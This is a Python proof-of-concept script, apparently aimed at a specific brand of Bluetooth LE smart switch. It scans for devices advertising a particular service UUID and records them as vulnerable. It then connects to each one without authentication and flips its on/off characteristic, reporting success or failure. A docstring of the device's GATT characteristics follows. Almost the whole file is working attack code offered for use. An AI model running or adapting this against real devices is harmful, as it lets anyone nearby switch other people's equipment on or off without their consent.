# -*- coding: utf-8 -*-
import time
import timeout_decorator
import subprocess
import pexpect
import sys
import os
import requests
import json
import pickle
import argparse
import socket
from bluepy.btle import Scanner, DefaultDelegate, Peripheral, UUID, BTLEDisconnectError, BTLEGattError, BTLEManagementError, BTLEInternalError


vuln_switches = []
DEBUG = True

class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            if DEBUG: print("Discovered device: %s, %s" % (dev.addr, dev.rssi))
        elif isNewData:
            if DEBUG: print("Received new data from %s, %s" % (dev.addr, dev.rssi))

def main():
    scanner = Scanner().withDelegate(ScanDelegate())
    # TODO:
    # .scan calls .clear(), .start(), .process(), and .stop().
    # we could do these manually and pass timer to process.
    # then call getDevices() to get all of the ones seen so far
    #try:
    devices = scanner.scan(5.0)
    for dev in devices:
        for (adtype, desc, value) in dev.getScanData():
            if value == 'a22bd383-ebdd-49ac-b2e7-40eb55f5d0ab' or value == 'ABD0F555EB40E7B2AC49DDEB83D32BA2' or value == 'abd0f555eb40e7b2ac49ddeb83d32ba2':
                print("[+] Discovered "+ dev.getValueText(7) +" device : " + dev.addr)
                vuln_switches.append(dev)
                print("[*] adtype: %s, desc: %s, value: %s" % (adtype, desc, value))
    for target in vuln_switches:
        p = Peripheral(target)
        #UUID("a22b0060-ebdd-49ac-b2e7-40eb55f5d0ab")
        switchval = UUID("a22b0080-ebdd-49ac-b2e7-40eb55f5d0ab")
        #UUID("a22b0090-ebdd-49ac-b2e7-40eb55f5d0ab")
        switchchar = p.getCharacteristics(startHnd=1, endHnd=0xFFFF, uuid=switchval)
        if len(switchchar) == 1:
            switchchar = switchchar[0]
            val = switchchar.read()
            if ord(val) == 0x01:
                print("[*] val: %s, flipping OFF" % (val))
                switchchar.write(b'\x00')
            elif ord(val) == 0x00:
                print("[*] val: %s, flipping ON" % (val))
                switchchar.write(b'\x01')
            newval = switchchar.read()
            if val == newval:
                print("[FAILURE] (val: %s, newval: %s" % (val, newval))
            else:
                print("[SUCCESS] (val: %s, newval: %s" % (val, newval))
                

    #except:
        #print("something happened")


"""
ABD0F555EB40E7B2AC49DDEB83D32BA2
0x031900000201061107ABD0F555EB40E7B2AC49DDEB83D32BA205FF0101170007FF010000000100


- Unknown Characteristic [R W] (a22b0060-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0080-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0090-ebdd-49ac-b2e7-40eb55f5d0ab)

Unknown Service (a22bd383-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0010-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0020-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0030-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0040-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0050-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0060-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [N R] (a22b0070-ebdd-49ac-b2e7-40eb55f5d0ab)
Client Characteristic Configuration (0x2902)
- Unknown Characteristic [R W] (a22b0080-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0090-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b00d0-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R] (a22b0200-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R] (a22b0210-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R] (a22b0220-ebdd-49ac-b2e7-40eb55f5d0ab)
- Unknown Characteristic [R W] (a22b0230-ebdd-49ac-b2e7-40eb55f5d0ab)
"""


if __name__ == "__main__":
    main()
